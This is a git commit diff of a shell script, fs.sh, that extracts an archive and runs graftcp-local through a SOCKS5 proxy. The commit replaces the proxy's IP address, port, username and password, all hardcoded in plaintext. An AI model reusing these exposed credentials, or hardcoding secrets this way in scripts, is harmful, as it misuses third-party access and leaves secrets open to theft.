a9ad269b60379ce2425b44767139390a4c0e6832
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-04-29 12:49:40 +0700

    Update fs.sh

--- fs.sh
+++ fs.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.9.154.251:12324
-socks5_username = 14a5029e51675
-socks5_password = 9d332fa7c0
+socks5 = 209.127.183.130:8228
+socks5_username = lebarankita
+socks5_password = buatTHRan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
